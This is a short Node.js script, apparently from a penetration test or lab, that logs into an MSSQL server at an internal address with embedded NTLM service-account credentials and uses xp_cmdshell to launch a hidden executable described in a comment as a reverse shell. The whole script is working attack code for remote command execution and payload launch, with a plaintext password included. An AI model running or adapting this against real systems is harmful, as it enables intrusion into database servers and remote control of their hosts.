const sql = require("mssql");
(async () => {
  await sql.connect({
    server: "172.16.0.11",
    database: "master",
    authentication: {
      type: "ntlm",
      options: { domain: "ODYSSEY", userName: "svc-mssql", password: "cml958782" },
    },
    options: { encrypt: false, trustServerCertificate: true, enableArithAbort: true },
    port: 1433,
    requestTimeout: 20000,
  });
  const q = async (s) => {
    try {
      const r = await sql.query(s);
      console.log("=>", JSON.stringify(r.recordset));
    } catch (e) {
      console.log("ERR", e.message);
    }
  };
  // Test reverse shell connectivity only (svc-mssql, not SYSTEM)
  await q(
    "EXEC xp_cmdshell 'powershell -c \"Start-Process -FilePath C:\\\\Users\\\\Public\\\\s.exe -WindowStyle Hidden; Start-Sleep 3; Get-Process s -ErrorAction SilentlyContinue | Format-Table Id,ProcessName | Out-String\"'"
  );
  console.log("STEST_DONE");
  process.exit(0);
})().catch((e) => {
  console.log(e);
  process.exit(1);
});
